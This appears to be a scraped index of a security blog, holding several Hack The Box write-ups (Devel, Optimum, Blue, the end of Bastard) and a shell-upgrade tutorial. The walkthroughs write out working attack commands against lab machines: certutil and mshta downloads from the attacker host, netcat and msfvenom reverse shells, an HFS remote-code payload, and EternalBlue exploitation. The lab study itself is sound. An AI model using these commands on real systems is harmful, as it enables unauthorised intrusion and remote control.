┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $x86_64-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $ll total 376K -rw-r--r-- 1 m4rc0 m4rc0 32K Apr 9 07:32 40564.c -rw-r--r-- 1 m4rc0 m4rc0 8.5K Apr 8 19:43 41564.php -rwxr-xr-x 1 m4rc0 m4rc0 323K Apr 9 08:06 MS11-046.exe -rw-r--r-- 1 m4rc0 m4rc0 187 Apr 8 19:45 session.json -rw-r--r-- 1 m4rc0 m4rc0 799 Apr 8 19:45 user.json Now that I have the exe file I can upload it to the victim machine using another Windows built-in tool, that is certutil.exe . To do that I first start a python simple http server in the directory where I have the exe file. ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $sudo python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Then PS C:\\inetpub\\drupal-7.54> ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bastard] └──╼ $sudo nc -lvnp 443 [sudo] password for m4rc0: listening on [any] 443 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49585 Client Connected... PS C:\\inetpub\\drupal-7.54> c:\\windows\\system32\\certutil.exe -urlcache -split -f http://10.10.14.61:8000/ms15-051.exe ms15-051.exe **** Online **** 0000 ... d800 CertUtil: -URLCache command completed successfully. dir Directory: C:\\inetpub\\drupal-7.54 Mode LastWriteTime Length Name ---- ------------- ------ ---- <SNIP> <SNIP> -a--- 9/4/2020 10:10 ?? 330189 ms15-051.exe <SNIP> <SNIP>p PS C:\\inetpub\\drupal-7.54> ./ms15-051.exe whoami [#] ms15-051 fixed by zcgonvh [!] process with pid: 2992 created. ============================== nt authority\\system Now, for some reasons I was unable to navigate to the administrator directory and grab the root flag using the ms15-051.exe from the cli. When I did try to read the file nothing was found. After few tries I then decided to get a full administrative shell. So downloaded a x64 version of netcat into the windows box: PS C:\\inetpub\\drupal-7.54> c:\\windows\\system32\\certutil.exe -urlcache -split -f http://10.10.14.61:8000/nc64.exe nc64.exe **** Online **** 0000 ... b0d8 CertUtil: -URLCache command completed successfully. Then, after having started a netcat listener on my attacking box, I run the following command to get a shell as admin: C:\\inetpub\\drupal-7.54> ./ms15-051.exe \"nc64.exe -e cmd.exe 10.10.14.61 9999\" so I get the shell back: ┌─[m4rc0@SittingDucks]─[~] └──╼ $sudo nc -lnvp 9999 [sudo] password for m4rc0: listening on [any] 9999 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.10.9] 49179 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\inetpub\\drupal-7.54>c:\\windows\\system32\\whoami c:\\windows\\system32\\whoami nt authority\\system and now I am able to read the root flag: C:#Users#Administrator#Desktop>type root.txt.txt type root.txt.txt 4b****************************7c","tags":"blogging","loc":"https://sittingducks.io/Bastard.html","title":"Bastard"},{"url":"https://sittingducks.io/Devel.html","text":"Recon root@SittingDucks:~# nmap -p- -sV -sC 10 .10.10.5 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 18:44 GMT Nmap scan report for 10.10.10.5 Host is up (0.065s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM <DIR> aspnet_client | 03-17-17 04:37PM 689 iisstart.htm | 02-27-20 04:03AM <DIR> thirty6 |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 151.47 seconds nmap reveals that there is an FTP server running on port 21 and anonymous authentication is allowed. There is also an IIS server (version 7.5) on port 80 which most probably works in combination with the FTP server. We can easily verify that. Navigating to the webserver we get this: root@SittingDucks:~# ftp 10 .10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:user): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> As shown above I used the anonymous user and a random password and I authenticated successfully. Now I create a simple html file in my kali box and I add the text hello World! inside. Then I upload this file into the ftp server: ftp> put test.html local: test.html remote: test.html 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 14 bytes sent in 0.00 secs (976.5625 kB/s) ftp> dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 01:06AM <DIR> aspnet_client 03-17-17 04:37PM 689 iisstart.htm 02-27-20 06:30PM 14 test.html 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. ftp> then I browse to that address: This confirms that we can upload stuff into the ftp server and we can execute it using the webserver since they work in combination. Using the same concept we can upload a webshell. IIS 7.5 supports aspx so we can create an aspx webshell with msfvenom: root@SittingDucks:~# msfvenom -p windows/shell_reverse_tcp LHOST = 10 .10.14.17 LPORT = 443 -f aspx > reverse.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 324 bytes Final size of aspx file: 2699 bytes root@SittingDucks:~# ll total 4 -rw-rw-r-- 1 root root 2699 Feb 24 08:47 reverse.aspx then I upload it to the ftp server: ftp> put reverse.aspx local: reverse.aspx remote: reverse.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 2734 bytes sent in 0.00 secs (36.7232 MB/s) ftp> After setting up a netcat listener on port 443 and hitting the address http://10.10./10.5/reverse.aspx I get a shell back as the iis user web: root@SittingDucks:~# nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.10.5] 49166 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv>whoami whoami iis apppool\\web c:\\windows\\system32\\inetsrv> having a look there seem to a user called babis further to Administrator. If I try to access both users directories I get access denied. c:\\Users>dir dir Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of c:\\Users 18/03/2017 01:16 <DIR> . 18/03/2017 01:16 <DIR> .. 18/03/2017 01:16 <DIR> Administrator 17/03/2017 04:17 <DIR> babis 18/03/2017 01:06 <DIR> Classic .NET AppPool 14/07/2009 09:20 <DIR> Public 0 File(s) 0 bytes 6 Dir(s) 24.604.782.592 bytes free c:\\Users>cd babis cd babis Access is denied. c:\\Users> Let's get the systeminfo: c:\\Users>systeminfo systeminfo Host Name: DEVEL OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: babis Registered Organization: Product ID: 55041-051-0948536-86302 Original Install Date: 17/3/2017, 4:17:31 System Boot Time: 27/2/2020, 6:06:31 System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 1.023 MB Available Physical Memory: 668 MB Virtual Memory: Max Size: 2.047 MB Virtual Memory: Available: 1.505 MB Virtual Memory: In Use: 542 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.5 From the systeminfo output I get that Windows version is 6.1.7600 N/A Build 7600. If I google that string the first result I get is the following privesc exploit: https://www.exploit-db.com/exploits/40564 I download it and compile the C file: root@SittingDucks:/home/user/Documents/htb/boxes/devel# i686-w64-mingw32-gcc 40564 .c -o MS11-046.exe -lws2_32 root@SittingDucks:/home/user/Documents/htb/boxes/devel# ll total 344 -rw-rw-r-- 1 root root 31866 Feb 24 12:22 40564.c -rwxrwxr-x 1 root root 299312 Feb 24 13:08 MS11-046.exe Then I upload it with ftp: ftp> put MS11-046.exe local: MS11-046.exe remote: MS11-046.exe 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 299312 bytes sent in 0.36 secs (807.2827 kB/s) The defaule IIS working directory in Windows is c:\\inetpub\\wwwroot so I move there: c:\\inetpub\\wwwroot>dir dir Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of c:\\inetpub\\wwwroot 27/02/2020 07:40 <DIR> . 27/02/2020 07:40 <DIR> .. 18/03/2017 01:06 <DIR> aspnet_client 17/03/2017 04:37 689 iisstart.htm 27/02/2020 07:42 65.686 MS11-046.exe 27/02/2020 06:50 2.734 reverse.aspx 27/02/2020 06:30 14 test.html 17/03/2017 04:37 184.946 welcome.png 5 File(s) 254.069 bytes 3 Dir(s) 24.604.094.464 bytes free Then I run the exploit: c:\\inetpub\\wwwroot>MS11-046.exe MS11-046.exe c:\\Windows\\System32>whoami whoami nt authority\\system Now we can easy get the user flag c:\\Users\\babis\\Desktop>more user.txt.txt more user.txt.txt 9e****************************e8 and the root flag c:\\Users\\Administrator\\Desktop>more root.txt.txt more root.txt.txt e6****************************4b","tags":"blogging","loc":"https://sittingducks.io/Devel.html","title":"Devel"},{"url":"https://sittingducks.io/Optimum.html","text":"Welcome to another retired Hack The Box write-up named Optimum. This box shows an RCE vulnerability of the Rejetto HTTP File Server 2.3, CVE-2014-6287. This vulnerability exists due to a poor regex in the file ParserLib.pas. In fact, the findMacroMarker function allows remote attackers to execute arbitrary programs via a %00 sequence in a a search action. Let us demonstrate the issue. Initial Nmap root@SittingDucks:~# nmap -p- -sC -sV 10 .10.10.8 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-14 10:23 GMT Nmap scan report for 10.10.10.8 Host is up (0.056s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 540.74 seconds The initial nmap shows only port 80 is open and HttpFileServer httpd 2.3 is running, also the server hosting this application is a Windows machine. Having a look on the web I find the HFS official website where HFS is described as follow: You can use HFS (HTTP File Server) to send and receive files. It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.It also differs from classic web servers because it's very easy to use and runs \"right out-of-the box\". Access your remote files, over the network. It has been successfully tested with Wine under Linux. It is clear we are dealing with a webserver that gives the possibility to upload files for sharing purposes. A search with searchsploit gives the following results: root@SittingDucks:~# searchsploit hfs 2 .3 ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | exploits/multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | exploits/windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | exploits/windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | exploits/windows/webapps/34852.txt ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Exploit 34668 shows this: # Exploit Title: HttpFileServer 2 .3.x Remote Command Execution # Google Dork: intext: \"httpfileserver 2.3\" # Date: 11 -09-2014 # Remote: Yes # Exploit Author: Daniele Linguaglossa # Vendor Homepage: http://rejetto.com/ # Software Link: http://sourceforge.net/projects/hfs/ # Version: 2 .3.x # Tested on: Windows Server 2008 , Windows 8 , Windows 7 # CVE : CVE-2014-6287 issue exists due to a poor regex in the file ParserLib.pas function findMacroMarker(s:string; ofs:integer=1):integer; begin result:=reMatch(s, '\\{[.:]|[.:]\\}|\\|', 'm!', ofs) end; it will not handle null byte so a request to http://localhost:80/?search=% 00 { .exec | cmd. } will stop regex from parse macro , and macro will be executed and remote code injection happen. # # EDB Note: This vulnerability will run the payload multiple times simultaneously. # # Make sure to take this into consideration when crafting your payload (and/or listener). According to this, we can use the search box in our favor and run any (Windows) commands we want remotely. As an example I filled the search box with \"test\" as shown in the screenshot above and I sent the request to burp. This is what the GET request looks like in burp: GET /?search=test HTTP/1.1 Host: 10.10.10.8 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: HFS_SID=0.185858400771394 Upgrade-Insecure-Requests: 1 so I edit the GET part as instructed in the exploit and I add the string C%3a\\Windows\\system32\\ping.exe+10.10.14.3. instead of cmd. . The string is the URL encoded and it decodes to C:\\Windows\\system32\\ping.exe 10.10.14.3. where 10.10.14.3 is the IP address of my kali box. I am doing this in order to verify the RCE. The request will be as follow: Before sending the request I had started a tcpdump on my kali box filtering specifically for icmp traffic to verify if the ping works: root@SittingDucks:~# tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 06:31:28.789828 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 49, length 40 06:31:28.789868 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 49, length 40 06:31:28.789879 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 50, length 40 06:31:28.789885 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 50, length 40 06:31:28.789893 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 51, length 40 06:31:28.789898 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 51, length 40 06:31:28.789911 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 52, length 40 06:31:28.789915 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 52, length 40 06:31:29.813484 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 53, length 40 06:31:29.813519 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 53, length 40 06:31:29.813531 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 54, length 40 06:31:29.813535 IP 10.10.14.3 > 10.10.10.8: ICMP echo reply, id 1, seq 54, length 40 06:31:29.813542 IP 10.10.10.8 > 10.10.14.3: ICMP echo request, id 1, seq 55, length 40 and as shown above I am able to see ICMP packets coming. This confirms the RCE. We can now use something else instead of ping in order to get a reverse shell For this demo I am going to use a tool called WeirdHTA which will help me to create an obfuscated HTA script that contains a reverse Power Shell payload. Then we can use MSHTA to run the HTA script. Thus, I clone weirdHTA into my kali box: root@SittingDucks:/home/user/Tools# git clone https://github.com/felamos/weirdhta.git Cloning into 'weirdhta'... remote: Enumerating objects: 161, done. remote: Counting objects: 100% (161/161), done. remote: Compressing objects: 100% (132/132), done. remote: Total 161 (delta 50), reused 76 (delta 21), pack-reused 0 Receiving objects: 100% (161/161), 66.23 KiB | 477.00 KiB/s, done. Resolving deltas: 100% (50/50), done. then I ran weirdHTA and I generate an HTA script which contains the reverse Power Shell: root@SittingDucks:/home/user/Tools/weirdhta# ./weirdhta.py █ █░▓█████ ██▓ ██▀███ ▓█████▄ ██░ ██ ▄▄▄█████▓ ▄▄▄ ▓█░ █ ░█░▓█ ▀ ▓██▒▓██ ▒ ██▒▒██▀ ██▌ ▓██░ ██▒▓ ██▒ ▓▒▒████▄ ▒█░ █ ░█ ▒███ ▒██▒▓██ ░▄█ ▒░██ █▌ ▒██▀▀██░▒ ▓██░ ▒░▒██ ▀█▄ ░█░ █ ░█ ▒▓█ ▄ ░██░▒██▀▀█▄ ░▓█▄ ▌ ░▓█ ░██ ░ ▓██▓ ░ ░██▄▄▄▄██ ░░██▒██▓ ░▒████▒░██░░██▓ ▒██▒░▒████▓ ░▓█▒░██▓ ▒██▒ ░ ▓█ ▓██▒ ░ ▓░▒ ▒ ░░ ▒░ ░░▓ ░ ▒▓ ░▒▓░ ▒▒▓ ▒ ▒ ░░▒░▒ ▒ ░░ ▒▒ ▓▒█░ ▒ ░ ░ ░ ░ ░ ▒ ░ ░▒ ░ ▒░ ░ ▒ ▒ ▒ ░▒░ ░ ░ ▒ ▒▒ ░ ░ ░ ░ ▒ ░ ░░ ░ ░ ░ ░ ░ ░░ ░ ░ ░ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ by felamos 1) Powershell Reverse Shell. 2) Custom Command. > 1 [*] Enter IP Address: 10.10.14.3 [*] Enter PORT: 443 [*] Written test.hta in the same directory where I have the script (test.hta) I ran a simple http server with python: root@SittingDucks:/home/user/Tools/weirdhta# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... At this point I need to modify the request in burp to contain this command C:\\Windows\\system32\\mshta.exe http://10.10.14.3:8000/test.hta. and URL encode it with CTRL+u Since I had chosen port 443 as the port for the reverse shell within weirdHTA I had already started a netcat listener on that port and after sending the new request with burp I get the shell: root@SittingDucks:~# nc -lnvp 443 listening on [any] 443 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.8] 49174 Client Connected... PS C:\\Users\\kostas\\Desktop> whoami optimum\\kostas As shown above I am in as the user kostas . I am also able to read the user.txt (for some reasons it is called user.txt.txt, but it worked when I add it on HTB): C:\\Users\\kostas\\Desktop>dir dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\kostas\\Desktop 20/02/2020 09:23 <DIR> . 20/02/2020 09:23 <DIR> .. 18/03/2017 02:11 760.320 hfs.exe 18/03/2017 02:13 32 user.txt.txt 2 File(s) 760.352 bytes 2 Dir(s) 31.893.934.080 bytes free C:\\Users\\kostas\\Desktop>more user.txt.txt more user.txt.txt d0****************************73","tags":"blogging","loc":"https://sittingducks.io/Optimum.html","title":"Optimum"},{"url":"https://sittingducks.io/Blue.html","text":"Welcome to another retired Hack The Box named Blue. This particular box demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly in March 2017. Initial Nmap root@SittingDucks:~# nmap -p- -sC -sV 10 .10.10.40 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 19:01 GMT Nmap scan report for 10.10.10.40 Host is up (0.019s latency). Not shown: 65526 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 199.25 seconds Port 445 (smb) seems to produce some interesting information, so let's explore port 445 in more details: root@SittingDucks:/home/user/Documents/htb/boxes/blue# nmap -p 445 -sC -sV 10 .10.10.40 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 22:58 GMT Nmap scan report for 10.10.10.40 Host is up (0.023s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 50s, deviation: 2s, median: 48s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-02-12T22:59:55+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-02-12T22:59:54 |_ start_date: 2020-02-12T22:11:17 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds with this nmap runs all the available SMB scripts and scan for related vulnerabilities: root@SittingDucks:~# nmap -p 445 --script vuln -sV 10 .10.10.40 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 20:32 GMT Nmap scan report for 10.10.10.40 Host is up (0.018s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) |_clamav-exec: ERROR: Script execution failed (use -d to debug) Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.73 seconds From the above output it's clear that the machine in question is vulnerable to MS17-010 , aka EthernalBlue, which could allow remote code execution if an attacker sends specially crafted messages to a Microsoft Server Message Block 1.0 (SMBv1) server. Let's see how we can exploit that. root@SittingDucks:~# searchsploit ms17-010 | grep -i \"windows 7\" Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows/remote/42031.py Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows/remote/42315.py I struggled a bit with both the above exploits because they require for you to get some parameters right, such us pipes. In my opinion they are not well documented and getting the parameters right is quite time consuming. Since EthernalBlue is very well known, there are a lot of scripts out there so I decided to try something different and easier. This project https://github.com/3ndG4me/AutoBlue-MS17-010.git ended up being what I was looking for. First thing first, I clone the project: root@SittingDucks:/home/user/Documents/htb/boxes/blue# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git Cloning into 'AutoBlue-MS17-010'... remote: Enumerating objects: 26, done. remote: Counting objects: 100% (26/26), done. remote: Compressing objects: 100% (25/25), done. remote: Total 102 (delta 12), reused 5 (delta 1), pack-reused 76 Receiving objects: 100% (102/102), 77.30 KiB | 210.00 KiB/s, done. Resolving deltas: 100% (52/52), done. Then I ran the shell_prep.sh script: root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010/shellcode# ./shell_prep.sh _.-;;-._ '-..-'| || | '-..-'|_.-;;-._| '-..-'| || | '-..-'|_.-''-._| Eternal Blue Windows Shellcode Compiler Let's compile them windoos shellcodezzz Compiling x64 kernel shellcode Compiling x86 kernel shellcode kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n) Y LHOST for reverse connection: 10.10.14.3 LPORT you want x64 to listen on: 9990 LPORT you want x86 to listen on: 9991 Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell 1 Type 0 to generate a staged payload or 1 to generate a stageless payload 1 Generating x64 cmd shell (stageless)... msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.3 LPORT=9990 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 460 bytes Saved as: sc_x64_msf.bin Generating x86 cmd shell (stageless)... msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.3 LPORT=9991 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 324 bytes Saved as: sc_x86_msf.bin MERGING SHELLCODE WOOOO!!! DONE I can see few binary files being generated: root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010/shellcode# ll total 80 -rw-rw-r-- 1 root root 20305 Feb 13 11:41 eternalblue_kshellcode_x64.asm -rw-rw-r-- 1 root root 19862 Feb 13 11:41 eternalblue_kshellcode_x86.asm -rw-rw-r-- 1 root root 1589 Feb 13 11:41 eternalblue_sc_merge.py -rw-rw-r-- 1 root root 2203 Feb 13 11:47 sc_all.bin -rw-rw-r-- 1 root root 1232 Feb 13 11:47 sc_x64.bin -rw-rw-r-- 1 root root 772 Feb 13 11:46 sc_x64_kernel.bin -rw-rw-r-- 1 root root 460 Feb 13 11:46 sc_x64_msf.bin -rw-rw-r-- 1 root root 962 Feb 13 11:47 sc_x86.bin -rw-rw-r-- 1 root root 638 Feb 13 11:46 sc_x86_kernel.bin -rw-rw-r-- 1 root root 324 Feb 13 11:47 sc_x86_msf.bin -rwxrwxr-x 1 root root 4556 Feb 13 11:41 shell_prep.sh Then after having set a netcat listener on port 9990 I run the exploit: root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010# python eternalblue_exploit7.py 10 .10.10.40 shellcode/sc_all.bin shellcode size: 2203 numGroomConn: 13 Target OS: Windows 7 Professional 7601 Service Pack 1 SMB1 session setup allocate nonpaged pool success SMB1 session setup allocate nonpaged pool success good response status: INVALID_PARAMETER done and netcat shows I got a shell on the windows machine: root@SittingDucks:~# nc -lvnp 9990 listening on [any] 9990 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.40] 49160 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32> I looked around and found the user.txt in the following location: C:\\Users\\haris\\Desktop>more user.txt more user.txt 4c****************************a9 and similarly the root.txt: C:\\Users\\Administrator\\Desktop>more root.txt more root.txt ff****************************17","tags":"blogging","loc":"https://sittingducks.io/Blue.html","title":"Blue"},{"url":"https://sittingducks.io/From basic shell to fully interactive.html","text":"Quite often during a pentest you finally manage to get a shell (potentially after several attempts and lot of time spent) but you soon find out the shell is very limited, in that tab-autocomplete, history, selection, etc. do not work and it is very frustrating to continue your engagement that way. This article describes how to upgrade from a limited shell to a fully interactive shell with a practicle example. Let us assume I managed to get a shell and I ran the whoami command showing I am in as the tomcat user: root@SittingDucks:~# nc -lvnp 1234 listening on [any] 1234 ... connect to [192.168.12.33] from (UNKNOWN) [192.168.12.123] 34780 whoami tomcat python -c 'import pty;pty.spawn(\"/bin/bash\")' tomcat@server1:/$ As my next step I ran the above python command python -c 'import pty;pty.spawn(\"/bin/bash\")' to upgrade to an interactive bash pty shell. We still do not have tab-autocomplete, history, etc. so we can do the following to get a complete working shell (from the pty shell): hit CTRL+Z to put the shell in the background: tomcat@server1:/$ &#94;Z [1]+ Stopped nc -lvnp 1234 run echo $TERM and stty -a to know the terminal type (screen-256color) and the size (rows 54; columns 190;) of the current TTY respectively, as shown below: root@SittingDucks:~# echo $ TERM screen-256color and root@SittingDucks:~# stty -a speed 38400 baud; rows 54; columns 190; line = 0; intr = &#94;C; quit = &#94;\\; erase = &#94;?; kill = &#94;U; eof = &#94;D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = &#94;Q; stop = &#94;S; susp = &#94;Z; rprnt = &#94;R; werase = &#94;W; lnext = &#94;V; discard = &#94;O;min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc With the shell still in the background, now set the current STTY to type raw and tell it to echo the input characters with the following command: root@SittingDucks:~# stty raw -echo Now foreground the shell with the fg command: root@SittingDucks:~# nc -lvnp 1234 reset reset: unknown terminal type unknown Terminal type? screen-256color You will have the netcat listener back. Digit reset to reinitialize the terminal and when you are asked for the terminal type add the output of the echo $TERM command I ran before. After the reset the shell should look normal again. The last step is to set the stty size to match our current kali window (from the info gathered on point 2) tomcat@server1:/$ stty rows 54 columns 190 Now we have a full interactive shell.","tags":"blogging","loc":"https://sittingducks.io/From basic shell to fully interactive.html","title":"From basic to fully interactive shell"},{"url":"https://sittingducks.io/Tartarsauce.html","text":"Initial nmap root@SittingDucks:~# nmap -p- -sV -sC 10 .10.10.88 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 04:58 GMT Nmap scan report for 10.10.10.88 Host is up (0.018s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 